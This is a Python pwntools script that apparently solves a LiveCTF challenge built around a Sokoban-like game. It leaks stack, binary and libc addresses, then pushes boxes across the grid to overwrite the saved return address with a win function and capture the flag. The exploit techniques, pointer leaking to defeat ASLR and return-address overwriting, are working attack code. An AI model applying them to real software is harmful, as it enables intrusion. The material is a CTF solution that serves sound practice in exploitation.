import argparse
import sys

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
# context.log_level = 'debug'
context.arch='amd64'


PATH = "/solve/handout/challenge"
# LIBC = "/handout/libc.so.6"
# LD = "/handout/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
    # r = process(PATH)
    r = gdb.debug(PATH, f'''
file {PATH}
c
''')

# enable debug
r.sendline(b"wssssssssrssssssssswa")

_=r.recvuntil(b"0x")
stack = int(r.recvuntil(b":")[:-1], 16) - 0x7c

ref_binary = stack + 0x48
ref_libc = stack + 0x28

print(f"{ref_binary=:#x}")
print(f"{ref_libc=:#x}")

_=r.recvuntil(f"{ref_binary+4:#x}: ".encode())
_=r.recvuntil(b" ")
bits = r.recvuntil(b"\n")[:-1]
binary_upper = b''.join(bits.split(b" ")[::-1])
_=r.recvuntil(f"{ref_binary:#x}: ".encode())
_=r.recvuntil(b" ")
bits = r.recvuntil(b"\n")[:-1]
binary_lower = b''.join(bits.split(b" ")[::-1])
binary = int(binary_upper + binary_lower, 16)

binary_base = binary - 0x1274

_=r.recvuntil(f"{ref_libc+4:#x}: ".encode())
_=r.recvuntil(b" ")
bits = r.recvuntil(b"\n")[:-1]
libc_upper = b''.join(bits.split(b" ")[::-1])
_=r.recvuntil(f"{ref_libc:#x}: ".encode())
_=r.recvuntil(b" ")
bits = r.recvuntil(b"\n")[:-1]
libc_lower = b''.join(bits.split(b" ")[::-1])
libc = int(libc_upper + libc_lower, 16)

libc_base = libc - 0x02a1ca

win_fn = binary_base + 0x1250

print(f"{stack=:#x}")
print(f"{libc=:#x}")
print(f"{libc_base=:#x}")
print(f"{binary=:#x}")
print(f"{binary_base=:#x}")
print(f"{win_fn=:#x}")

# get over board ptr
r.sendline(b"rssssssswss")
_=r.recvuntil(b"Sokobin!")

def readgrid():
    grid = []
    for i in range(32):
        _ = r.recvuntil(b": ")
        grid.insert(0, r.recvuntil(b" ").decode())
    return grid

grid = readgrid()
print('\n'.join(grid[::-1]))

from path import *

def pathto(ex, ey):    
    (x, y) = curpos(grid)
    print(f"path {x} {y} -> {ex} {ey}")
    # print(grid)
    moves = pathfindstr(grid, x, y, ex, ey)
    if moves is None:
        return False
    print(moves)

    r.sendline(moves)
    _=r.recvuntil(b"Sokobin!")
    return True

return_line = 10

# return addr on lines 14+15
# return rbp on lines 12+13
# can't just clear one so clear both
pathto(0, return_line - 3)

# clear return addr
moves = b""
for i in range(32):
    moves += b"wwwwrrrrs"
moves += b"a"*32
r.sendline(moves)
_=r.recvuntil(b"Sokobin!")
grid = readgrid()
(px, py) = curpos(grid)

print('\n'.join(grid[::-1]))

target_points_1 = [x == '1' for x in ''.join([f'{x:08b}'[::-1] for x in p32(win_fn >> 32)])]
target_points_2 = [x == '1' for x in ''.join([f'{x:08b}'[::-1] for x in p32(win_fn & 0xffffffff)])]

print(target_points_1)
print(target_points_2)

target_y_2 = return_line
target_y_1 = return_line + 1

for (x, v) in enumerate(target_points_2):
    if not v:
        continue
    # find first empty y above @ on x
    found_it = False
    for y in range(target_y_2 + 1, 31):
        if grid[y][x] == 'o' and grid[y + 1][x] == '.':
            if pathto(x, y+1):
                for i in range(y - target_y_2):
                    r.sendline(b"r")
                    _=r.recvuntil(b"Sokobin!")
                    grid = readgrid()
                    if grid[target_y_2][x] == 'o':
                        break
                found_it = True
                break
    assert found_it
    r.sendline()
    _=r.recvuntil(b"Sokobin!")
    grid = readgrid()
    print('\n'.join(grid[::-1]))
    (px, py) = curpos(grid)

while py != target_y_2 + 1:
    r.sendline(b"r")
    _=r.recvuntil(b"Sokobin!")
    grid = readgrid()
    print('\n'.join(grid[::-1]))
    (px, py) = curpos(grid)

# clear line for target y_1

for i in range(32):
    pathto(31, target_y_1)
    r.sendline(b"a"*32)
    _=r.recvuntil(b"Sokobin!")
    grid = readgrid()
    (px, py) = curpos(grid)
    if px == 0:
        break

    if px > 12:
        pathto(4, target_y_1 - 1)
    elif px > 8:
        pathto(3, target_y_1 - 1)
    elif px > 4:
        pathto(1, target_y_1 - 1)
    else:
        pathto(0, target_y_1 - 1)

    r.sendline(b"ws")
    _=r.recvuntil(b"Sokobin!")
    grid = readgrid()
    print('\n'.join(grid[::-1]))

r.sendline(b"a"*32)
_=r.recvuntil(b"Sokobin!")
grid = readgrid()
(px, py) = curpos(grid)
print('\n'.join(grid[::-1]))

for (x, v) in enumerate(target_points_1):
    if not v:
        continue
    # find first empty y above @ on x
    found_it = False
    for y in range(target_y_1 + 1, 31):
        if grid[y][x] == 'o' and grid[y + 1][x] == '.':
            if pathto(x, y+1):
                for i in range(y - target_y_1):
                    r.sendline(b"r")
                    _=r.recvuntil(b"Sokobin!")
                    grid = readgrid()
                    if grid[target_y_1][x] == 'o':
                        break
                found_it = True
                break
    assert found_it
    r.sendline()
    _=r.recvuntil(b"Sokobin!")
    grid = readgrid()
    print('\n'.join(grid[::-1]))

print(f"{stack=:#x}")
print(f"{libc=:#x}")
print(f"{libc_base=:#x}")
print(f"{binary=:#x}")
print(f"{binary_base=:#x}")
print(f"{win_fn=:#x}")

r.sendline(b"q")

r.sendline(b"./submitter")
r.sendline(b'./submitter')
r.sendline(b'./submitter')
r.sendline(b'./submitter')

flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
